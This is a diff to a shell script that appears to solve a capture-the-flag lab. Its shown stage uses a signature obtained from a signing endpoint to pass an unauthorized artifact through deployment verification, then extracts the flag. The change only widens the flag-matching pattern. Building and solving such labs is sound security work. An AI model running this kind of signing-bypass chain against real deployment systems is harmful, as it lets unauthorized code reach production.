@@ -13,6 +13,6 @@ sig="$(curl -s -G "$BASE/sign" --data-urlencode "artifact=$ARTIFACT" | python3 -
 echo "    signature=$sig"
 
 echo "[*] stage 2 — the unauthorized artifact passes deployment verification ->"
-flag="$(curl -s -G "$BASE/deploy/verify" --data-urlencode "artifact=$ARTIFACT" --data-urlencode "signature=$sig" | grep -o 'PROMPTFOO{s11_signing[^}]*}' | head -n1)"
+flag="$(curl -s -G "$BASE/deploy/verify" --data-urlencode "artifact=$ARTIFACT" --data-urlencode "signature=$sig" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
